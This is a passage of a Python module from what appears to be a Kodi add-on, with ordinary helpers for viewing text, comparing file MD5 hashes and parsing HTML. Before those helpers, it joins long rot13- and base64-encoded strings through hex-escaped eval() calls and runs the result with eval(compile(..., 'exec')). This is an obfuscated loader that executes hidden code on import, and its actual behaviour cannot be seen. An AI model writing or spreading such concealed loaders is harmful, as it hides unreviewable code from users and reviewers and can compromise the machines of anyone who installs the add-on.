HgjGz15oyAZnwMQZx9FA0cQI2udnJuZpmu4EyZlLwtkAwOXpmEYoUORGH53LmSvE01eYmEyBH4kDaOjrTSnBIOYFISuIKWaHRgSp0AXHRAyMwOJF1EMMID5IIW6MTyVGH8iFQWgLH9eoF9VDJSuIJcuqyHjnRMbpmufoSSPp1ReH3clqwEJL2RkJFpAPz9lLJAfMFN9VPp0MwMzAwD2ZmLmAwZlLwWvAQx1LGp4AGN2MQMuZmx3ZmH2AJR1ZwMzZmNmBQDmZzV0AQL2AmV0BQD2AJR2ZGZkAwLmAwquATV0BGWzAGH2ZGp2A2R0AQD2ATDmZmL0AwZmAGquAGp0AGIuAwDmBQEzAmx0AGZlAmN1LGZ1Awp2AwEvAwx3ZQpmAGx1LGDkZmp1AGp0A2RmZGD0AwZ0BQZ4ZmxmAwMyZzL2ZGMvATRlLwL5AQVmAGZ0AQH1BGEyAGD1AQHjAJR2LGD4AGN1AGMuA2R0AQHlAwD3LGH4AGL1LGZ5AJR3AGH4ZzV3ZmpkZzV1BQL4AmH1ZmD0AzD1AmHlAGx0BQZ0AwL3AwD4AmZ2ZwL5AwH0MGDmAQt0MQp0AmZ3AGExAQL0MGp5AwR2AQDkZm'
oracle = 'c2MjU1NmQ3OTU4NTQ2ZTUzNmM3NjU4NDk2YjMyMzA1NzZhNzA3MzM5MzA0NzM0NmM3NDY3NDk0ZTc1NzI3ODM5MzA0ZjMxNjI3NzQzNDQyYjMxNGUzMzU3NjI1MjRjNDEzOTMyNjEzODc5MzM1ODcwNjczMjc3MmY0ODYzNjY3ODY1Nzg2MTUzNmU0YzRjNjIzOTY0NTk3NTcyNTA3MDQyNTc0ODRhNTY3NTJmMzM0ODM5NzYzOTRkNTg2ZDcyNGE2OTRmMzAyYjMzNDEzMTMyMzI2MTc3NjY1MzQxMzQ3MDc0NTkzOTMyNjU1YTQ4NzM0YzYzMzc0MjM5NzAzMTczNGM1ODRkNTA0NjU1NWEzOTc0NDM3MzZlNmU2ZTZlNTM0ZTcwNmE2MzZmNGQzOTc2NjE0NTc4MzI0YTJiNjM3NDc4NjE3MDY1Nzc2NjU0NTMzMTRmNTY1NjQ2Nzk2ZTcyNDQ2NDc2NzY0OTRlNzA1YTc1NmY3YTc1MzY1NjU0NDc3NzZhNjI3NjUzNzQ0ODQ3NGE3NDU1NmM0NDYyNTM2MjYxNjk3MDUzNjM2MjZhNGY1MzY2NzQ1Mjc0NDI3NDRhNzczMzUzNmY2YTcyNjM2YjMyNTc1NzZlNmM0NTM5MzA3YTMwNTU2ODM2NTg2NTZhNGU1YTMxNzU1NjM2MzA3NDQ0MzAzNDc4NzM2ODU2NDkyYjc5NmI1MzM2NjEzOTUyNzQ2YzU0NTA2MjYxNDE2NDRlNjMzNzQxMzk3YTJmNjE1YTYyNzQyZjRmNTY2ODU2NzA2NDYyNjI0YTMyNDU1YTRjNzI3MjcxNDY1NDQ2NzI0YjU5NTI3MzU1NzI2ZjM5Mzk0YjM5NGM2ZDY0NTc3ODZmMmY1OTMyNjE2ODZhNGI3NzMzNzQ1MjY1NTk3ODc1NzA0OTcwNTg0MTY0NzE1YTc1NGMzNTcxMzY2MjYzMzgzNTMyNTEzNzRmNmM0NzM3MmY2MTM3NzA1NDc0MzAzOTRjNDkzOTY0NzQ2MzRlNDk0ODc0NDM2ZTcwNGM3MjVhNjYzMjY2NGM1NTY0NDM1NDM5NzcyYjQ5MmIzMjRmMzU1NTc1NzYzMTMwMzY0ODJiMmI0MjdhNmI3NzcyMzIzNTQ4NjE3MjcwNzY2ZTQ3Njc3ODMwNmI1MzRiMzc2MTc5NDIzOTQ5MzE3NTRiMmI3MDMyNDc2NTU1Njg3NjU5NjgzMTQ4NjM2ODQ5NTc2ZjZkMzA3NjYzNGYzMjRhNzU2MzZkMzk1NTc4MzY0OTRlNjIzMDRiMmI2YjQxMzA2OTRiMzY3MjU2NTc3ODQ0NTg1NjY3NjUzNDc2MzAzNzdhNDMzMTZmMmY0NDc2NDg2Njc4Nzk2ZTRmNjgzNzMzNjQ2MjRmNTM1MDRmNzg3ODU1NjEzNzczMmI1NjRhNzY2NTZhMzI0Zjc0NzQ2ZDYzMzg3MTc0MzIzODU1NGYzMjMzNmQ0OTQxMzQ2MzMwNDY3NTY2NTQ2NDRjNDU3ODc0NTUzODMxNDQ1NTU5NjQ3MzZjMzM0NjM4NTY2ZjU4NGY2NDc2NTc2MjQxMmI1MzRjNzE2NzMxNDQ1Nzc5NTQ2NDZmNTgyYjM1MzE1MDYyNGIzNjJmNTk1MjczNzkzMTRjNDY2OTY2MzMzOTUwNjU2ZTRlMzk3OTcyNTk2ZTQ3MzAzMjMxNTg2NzJmMzY3MTMyNDg2MjU2NjI2MTdhNmI0MTZhMzI1MzM5Njk1YTM5Nzg0ZjczNTM2ZjM2NjI0ZTUyMzM3ODY2NzU2NTYyNTU0ZTZjNjM1NDRjNjMzMzMyNTA0ZjMzNDU3NDcxNzA3NTM4Nzk3MjcxMzg3ODMxN2E1NTc2MmIzOTMwNmE1NDRjNjg2ZDMzNjg3MTU2MzE0YTU3NmQ2YjZiNjY2MzQyNTk0YTJmMzEzMTZkNDc2OTM1NmE0YzUzMzU3MDcxNzk3NDc5NjIzNjRkNGMzNzYyMmY0ZTc4NGY3NDZiMzc0NzY0NzI1NzZiNDU3ODZiMzM0ODU2NzY0NzYxNjY2YjY5MmY1OTZmN2E3NTUzNGI1MDUyNDg3MDc4NjYzOTVhNzE0NzcwNWEzNjRhNGMyZjUyNzY2ODJmNTk2YTMzNTY0MjRmNjI1NzJiNDgzMTMwNDQ2Zjc5MzY1MjM5NTM0OTRkNjk3MjcyNTA3NDU0Mzc2YjUxMmYzOTU3NDY3NTRlNDE3YTdhNzY0ZDczNWE2ODc2NTgzMTc1NzY1MjRjMzI2ODQ4NTIzOTRkNzI2YzZmMzQ3YTUyMzk1MDUyMzE0MjYzNzA1MTQ2NzUzMzZlMzc0ODY2MzM0ZTQ4Nzg1OTU1NzczMDQyNzUzMzQyMzk3MTQ3NjEzOTQ3NzU3ODRjNjEyYjc2NGI1OTdhNTU0NjY0NzY2ZDMyNzU2MzY0MzA2ZDQ3NzEzMTMyMzE1MjU0NTk1MDQ4Njg2ZjM1NTAzMDZlNGYzNjQ4NjE2ZDc2NzI3Mzc5NGE2NzU0NmM3MDQ1NjI1YTQ2Njk1NTJiNmI0MzQ1NWE2NTUzMzI0MTM4MzA3NDM3NjE0ODc2NGY0YTZlNjk1MzRlNzAyZjU2Mzk2ZjUyNzg3MjU1NmM2NzYzNGUzMTMyNjI2NzUyMzg1MjQ0N2E1NjRlNzEzNjJiNWE1NDQ4NjgzMTRkNjY1MzMxNDYzOTRhNzI2YTZmMzU2MjMwNzQzMjdhNmM2MTU5NmU1OTMwMzE2MjRiNTYzNjZlNjM1MDY3NGQ3NTU4NTQ3MjZlNGU1MzM1Mzk3NDJiNjUzMTMyNzU2ZDUwNTE2YTdhNGE3ODMzNTA0ZjQyMzM1YTM3NmY2NTY0NjI1NTMyN2EzMDRmMmI3YTc5MzAzOTM5NmM2MTUxNzg2OTRhNjU2YjQ3NTE2NjUzMzE2ZTZkNmMzNDMzNjU2MzM1NmQ0NTM3NTg0ZDY2NmUzNTRjMmI2YjU2Nzk3MjY5NDk2NTU3NDU3YTU3NzY1MzJmNWE3MjUzNGQ2YTUxMzk0MTRmN2E0YTUzNTc3Njc5NmQ1NzMxMzM2NjU1NTc0NzM5NDQ0MjM4Njc0YzZhNDYyYjU1Njk2MjRmMzY1MTRjNTM0MTczNGE1MTM3NjY1YTM2NTc2MzJmMzg1MjJmMzYzNjQ4NTc2MjZlNzU1MDMwMmI3MzUyNzQ1NDYyNmU3OTU3Njc0YTcwNDU1OTMxNzI0NTM2MzE0ODc2Mzk0YzU4NDU2NjY4NGQ2ZDc0NDM2MzM2NDc1YTY4MzY2NDc5NmI2MTU0MzE0ZTM4Njg0YTU4NDQ0ZjU5NDQ3NDczNDY3MDc0MmI2YjM2Njc1YTcwNmY3NTU1N2E3MjY0MzI0MzY1NTU2NDc3NzYzODM1NTc2ZDU0NDQ1OTU0NGM2NTYyNDk2OTYzMzU0NTcyNGY2NzMyNjU3OTU5NmQ0NzYzNWE3OTZmNmY1NzQyNTk3YTZjNzAzNDM1NzAzNTU0NGY0ZDZkMmY0NTZjNjY1NTM3NDYzMTUwNDY2NTRkNGMzNjc5NmU2MTU2NGY0ZjQ5MzczMjVhNmU0NDU3NjU2YjM4NzI1Njc0NGEzMzUzNGU0MzRiMmI0YTJiMzE2ZjYxNzI3MDcyNmY3MzRhNDk2YzM1NmEzNjc1NmI1YTQ2NDc2YjZjNjY3Nzc5NDY2NTZlNmI2ZDRjNzI2MjZjMmYzMjQyNTYzNTMyNzQ1NDU4NjU3NTY4MmY3NDYxNzY3MDZmNTM2Yzc2NTE3MjM2NGI3NTRkNTA3MjQxNzE1MjVhNTM1MDRmNTI0Njc0NjQ3NDY1NGU3MjY4NGQ2YzMzNzI0YjY1NTk1NDMzNTU0ZTYxMzU3MTRhNzQyYjZhNGQyZjZiNjQzNDc3NGU0ODMyNmIyZjVhMzk3OTYxNWE2ZjQ0MmI1OTdhNzg1Mzc4N2EzNTY1NjMzMTQ1MzAzODc3MzYzMzJmNDk2MTY4NzM0ODMxNDQzNjUyNzg1MzQ3NjU3NzU0Njk0MjY0NTQ1NDcxNjI0ZTQyNzI2YTUxNGU1MDQ4NmE0NjY0NjU1MjM5NDIzMDc1NGI2ZTc0NGU2YzMxNGM1OTRkMzU2YTUwNzI2MzZlNDc2YjY2NTQ1NDYxNTI1MjY1NDczMjRhMzEzMTc3Nzc2YTM2NDI2NTZkNDY2NTRhNjYyYjY2NGE1ODJiNjgyZjMyNmEzNDM2NmEyZjMyNmI2ODU1N2E3NDc4MzU2ZDZkNmQ1MzMzMzQ2ZDYxNWE1NDUzNTA3NDUwMzE3NzM2NTk3YTMwNmI3MDc1NGE3MDU3NTk3MjM3NTE2NDUxNmE3MDc5NTU3MjU0NjM3MzU0MzE3MTM0MzUzMzY2NWEzMjRiMzMzMjJmMmIzMDRkNjU2Mzc0NDI3NjcwMmI1OTZiNTc1OTM3MzE0MzY1NmY3MTU5NGI0YjY1MzQzODZjNmI0NDQ1NjQ2MzRmMmI2YTcyNDc3NDQxMzkzOTQ0NTc3NjU1NjM2MTZhNzA1OTY0NGEzMDc4NTU1MTMzNWE3MzRjNTczOTRhNjU2YzM2NzgzMTRlNmYzMDM0MzA3NTZhNzYzNTQ0NjY0ZDc0NjM1NzcyNmU1NDc2Mzc3MTZiNDgzNDY5Mzc3MDRiMzY2ZTRmNjkzNjc5NWEzOTM1NzI2NTQ0NTg2NTcwNTc2ZDczMzY3MTQ0NzY2YTQ5Nzg1NTYxMzQzNjZlNmI2Njc0MzkzNzUxNzIzNjM2MmI3MDRjNmQ0NjY0Njg1NDdhNmQ1NDZlNzI1NDRlNDM0ZTcwNGM2YTQ4NjgyZjU1NTQ1NDU3NTI0ZDc1NGE2NTY2NzAzMjY4NDQ2NTVhMzE3YTZmNjU0ZTU4NTgzMTdhNTI0ZjM2NTM3MzU5NDc2NTczNTIzNTZjNmU1MzUwNjY1MTMzNzg2NjdhNGQ2MTMzNDg0NzY0NGEzMjQ4N2EyZjcxMzY2NzY0NjE1ODMwNmE1MTJiMzQzNDUwMzIzMTdhNTEzMDM2NTY0YTZhNmY2YjU2MmY3MzQ0MzY2MjM2NmIyYjY2NTc0YTc5NjY3MDJiNzM0NzQ3MmY2ZjY5MzkzMzc1NmQ2ZTMyNzMzNTZkNGI2MzMxNGU1NTc1MmYzMDM5NjM0OTRlNDQzMDM5MzE1MjZhNGQ1Njc4NjQ0ZTZlMzAzMDMwNzY0YjU5MzY3MDM3NzE0ZTMxMmY2NTMwNzYzNzY4NTQ2NjU2Nzk1MjYyNmQ2MTYzNTMzNDMyNzY3YTQ0MmI3MTMwNmE1MzcxNzI2MTJiMzI2MTQ0NzE0YjM3N2E0ZjRmMzQ3NzZiMzc1NzQ2MmY3MjRmNmY1NjMxNGQ3NTc0NmM1ODczNGY2OTZlMzc0OTQ3NWE1NjMyNmU3MjdhNjQ1OTc1NjczNzUzMzEzNjQ4MmI3MTRlNTA0MzM2NWE3MTQzNzY2YTM3NGE2MTc4NmQzODY0NmM0OTRmMmI3MDcxNTk3YTcxNjY3ODUyNDYzMTQzNmU3YTcwNjU0ZTRkMzU0OTY2NTIzMjUyMzk2NTUwNTA3NTc0NTQ1MTY2NzMzMDM4MzQyZjQyMzY0OTYxMzg0NDYyNzE1YTM0N2E0NDUzMzk0MjdhMzg3NDc0NDIzMDZlNTc3MjJiNzczOTUwNTU2ZDZlMzc1MTM3MmY1YTU0NTk3MDZlMzI1NzM5NjM0ZTMwNTA1OTJiMzQzNjUyNDM0ODY5NjE2NTczMzYzNDc2NzA2OTY4NTg3NDU4NmQ3NjY0MzgzNTZmNDEzNDZjNmU3ODc1NjgyYjc2NzMyZjQxMzY2ZTYxMzc3MjRhNjg3MTUwMmI0NTUyNjM1YTYxMzIzODM0NjI1ODQzNzMzNzM0MzI3MTc1MzM1MDM2N2E1MDRkNDUzMDRhNjY0ZDU1NDYyYjM0NTg1NzY4MzI1ODUxMzk1OTRkNGM0YzZjNjIzNjc1NDk2ZTM5NjU0YzM5NTg1ODMxNmE1MTMxNzE3NTc2NzY2YTUwNzQ0MTdhNjU0NTY2NzU0NTJmNTczNTM1NjE2ZDM2NTQ0ZTM5NmU2MTMyNjYzODY4NTQzMDcxNzEyZjY2Mzg1ODcxNjEzOTZkNzY3MTMyMzk0YzM1NzUzNTRjNjE2YTM2NjUzNDMwNDY1NDM1NzE0YjJiNzQ2YjY3NjE2YzU0MmI2OTYxMzQ3NzM5MzU1OTMyNzY0YjQ2MzY3YTZhNzQ0ODJiNzk3NjY5NTc0ZTUzNTgzMzc4NjU3MDZkNzAzNjMzNDU2NDUyNzg3NTRlNzMzNzZmNjUzMDJmNTY2ZjdhNGY3MzY5MmI2ODcyNGE1MjRmNzM3YTcyNjg0MTUwNzU2ZjVhNDQ2ZTYzNDI3MjY3NDY3OTU4MzEzNzVhMzQ0ODYxNDc2ZDMzNzg0OTMzNGMzNzYxMmI1NDZhNjY3MDZlNDg1NzQ3Nzg2NTczNDE0NTMyMzI3MjM4MzU0Nzc0N2E3YTQ3NjE2MzZkNjQ2NDZmNGQzOTY0NzY2MjM0NTc3MDU4NDc1OTM4NTE3MDJmNzE0ODZhNGU2OTc0NjM1ODZkNGI2MzMxNmU2Mzc4Mzg0ZTY0NjUzMDRlNGY3NTU0NTQ0ZDc0NmIzNjY2NGY1MzZmMzI2YzU3NTUzOTY1NDQ3NjRhNjE3MTM2NTg2ODY4MzY0Yzc4NTQzODY0NmY0YzcyMzM1MDc3NGY2YzYzNzgzMTYzNTA0NTY3Mzg'
keymaker = '2MQH3AQRlLwH2AGD3AGMvAwV2BGZkAGR0LmMxAJRmBQH5AGVmAwp4AwL0MwHlZmH3BGWvAmZ0ZGZ3AmV0MwH5ZmH1BQL0AzL0AQZmAmL0ZwLkAQLlLwMzAmL3AwMzAGRmAwL3ZzLlLwplAmV1ZmplAQplLwWzAzV0AmHjZmNmBGL0AQD2ZGMyZmRmBGMuAwD2AGHlAGZ0AwZmAGN0MGH5Zmp3LGHjAQx3AQp4AzD2LmLlAzD2AGH1AQV2AwZlZmx0Lmp4AwD0AmH5ATH3ZGD4AQR0Mwp2AmN3BGD3ZzV2MGL3ZmH2AwL2AQR2LwH4AQR2AQquAzH3ZwH1AzR3LGIuAwH1ZwL3ZmR0MQZ5ZzV1AGH0Amx1AGWvAGV2AwLmAGt3ZwH3AJRlLwMzAQL2AGL0ZmNmAwpmAQZ1ZQp5AmR1AwMxAQZmAmZ2ATD3ZwWvAwD2AGZ4AmxlLwL2AzV3ZwZmATZ3BGL1Amt2ZwHjZmx2MwZ2ATH0MQWzAmD1AwL0AwL2LmH2AwD0MQMvZmR0BGMuZmtmAwDlAmH3AmH2AGt0ZmL2AwH2LGquZmV0BQp4AQL2BGHkZmx3BQp5ZmZ2BQMzAmR2MGH4AmZ0AmDmAmL0MwL5AGx1AmEwAmVmZmH1AQZ2AwpmATL1LGDlAmLmAQquAzL3LGquAQL2AGH0ZmxmBQplAmV1AQZ4Amx1BQMvZmx3AGp5AQL3ZwD2ZmL3ZmD2AwD0ZmMuAzVmBGMvATL2AQZ3ATR0LwWzAGx2Amp5AQx3AQp4AGt3ZmZkZzLmZGIuAQp2LmL1AmxmAQMuAmH2AQHmAQRlMwEwAGZ3AQL1ZmtmBQH3AwH3BGp2AzV2MGHlAmZ3ZwZjAmL3BQLlA2RmZmWzAGN3BGHjAmD0AmH4AGD1ZQp4AmZ0Mwp3AwtmZGD1ZmVmBGD5AGNlLwp0ZzV1AwLlZmV0AGD0AwplLwZ0AGN3LGpmAGx2AQL3Awx0LGD2Zmx0LwL2AmN0ZwZ4AGt1ZQp2AGRlMwDmAmVmAGHkATD2BGMyAwH3BGp2AJRmZGMwAQx3BQZ5ATD0ZmL1AQDlMwH2AwZ0MGZ1AQZ3AwZjAGt0LGL4AQD0BQpmAzR0AwMyAmZ2BQWvATZmAQH3AmD1ZGp1Zmx3ZmplAwD0ZmL2AmN0MQZ5AQDmBQZkAzH1AmZ5AGD0AQp4AGNmBQZ1ATDmBQZmAzH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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

def textViewer(file, heading=addontitle, monofont=True):
    xbmc.sleep(200)
    if not os.path.exists(file):
        w = open(file, 'w')
        w.close()
    with open(file, 'rb') as r:
        text = r.read().decode('utf-8', errors='replace')
    if not text: text = ' '
    head = '%s' % heading
    return xbmcgui.Dialog().textviewer(head, text, monofont)


def filemd5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def matchmd5(old, new):
    try:
        old_md5 = filemd5(old)
        new_md5 = filemd5(new)
    except:
        return False
    if old_md5 == new_md5: return True
    else: return False


def parseDOM(html, name="", attrs={}, ret=False):
    # Copyright (C) 2010-2011 Tobias Ussing And Henrik Mosgaard Jensen
    import re
    if isinstance(html, str):
        try:
            html = [html.decode("utf-8")]
        except:
            html = [html]
    elif isinstance(html, str):
        html = [html]
    elif not isinstance(html, list):
        return ""

    if not name.strip():
        return ""

    ret_lst = []
    for item in html:
        temp_item = re.compile('(<[^>]*?\n[^>]*?>)').findall(item)
        for match in temp_item:
            item = item.replace(match, match.replace("\n", " "))

        lst = []
        for key in attrs:
